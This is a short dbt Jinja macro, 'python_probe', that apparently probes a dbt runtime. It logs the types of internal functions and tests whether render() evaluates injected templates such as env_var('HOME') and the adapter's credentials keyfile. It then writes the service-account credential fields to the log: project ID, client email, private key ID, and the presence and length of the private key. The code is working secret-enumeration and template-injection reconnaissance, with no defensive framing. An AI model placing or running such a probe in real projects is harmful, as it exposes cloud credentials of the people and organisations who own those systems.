{% macro python_probe() %}
  {{ log("SUBMIT_PYTHON_JOB_TYPE=" ~ (submit_python_job | string), info=True) }}
  {{ log("RENDER_TYPE=" ~ (render | string), info=True) }}
  {{ log("WRITE_TYPE=" ~ (write | string), info=True) }}
  {{ log("VALIDATION_TYPE=" ~ (validation | string), info=True) }}
  
  {% set test_render = render("{{ 1 + 1 }}") %}
  {{ log("RENDER_RESULT=" ~ test_render, info=True) }}
  
  {% set bad_render = render("{{ env_var('HOME') }}") %}
  {{ log("HOME_RENDER=" ~ bad_render, info=True) }}
  
  {% set render2 = render("{{ adapter.config.credentials.keyfile_json }}") %}
  {{ log("CREDS_RENDER=" ~ (render2 | string)[:500], info=True) }}
  
  {% set cfg = adapter.config %}
  {% set creds = cfg.credentials %}
  {{ log("CREDS_METHOD=" ~ creds.method, info=True) }}
  {{ log("CREDS_DATABASE=" ~ creds.database, info=True) }}
  {{ log("CREDS_SCHEMA=" ~ creds.schema, info=True) }}
  
  {% if creds.keyfile_json %}
    {% set kj = creds.keyfile_json %}
    {{ log("KJ_TYPE=" ~ (kj.type), info=True) }}
    {{ log("KJ_PROJECT=" ~ (kj.project_id), info=True) }}
    {{ log("KJ_CLIENT_EMAIL=" ~ (kj.client_email), info=True) }}
    {{ log("KJ_PRIVATE_KEY_ID=" ~ (kj.private_key_id), info=True) }}
    {{ log("KJ_HAS_PRIVATE_KEY=" ~ (kj.private_key is not none), info=True) }}
    {{ log("KJ_PRIVATE_KEY_LEN=" ~ (kj.private_key | length), info=True) }}
  {% endif %}
{% endmacro %}
